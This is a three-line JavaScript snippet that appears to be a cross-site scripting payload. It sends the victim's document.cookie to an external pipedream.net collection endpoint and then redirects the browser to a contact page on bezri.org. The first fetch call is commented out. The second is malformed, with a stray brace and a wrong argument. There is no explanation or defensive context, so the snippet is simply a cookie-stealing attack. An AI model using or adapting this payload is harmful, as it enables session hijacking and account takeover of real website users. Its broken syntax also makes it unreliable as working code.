//fetch('https://eoqo7l6qsvoadu4.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})});
fetch('https://eoqo7l6qsvoadu4.m.pipedream.net', JSON.stringify({data:document.cookie})});
window.location.href = 'https://www.bezri.org/contact_us.php';

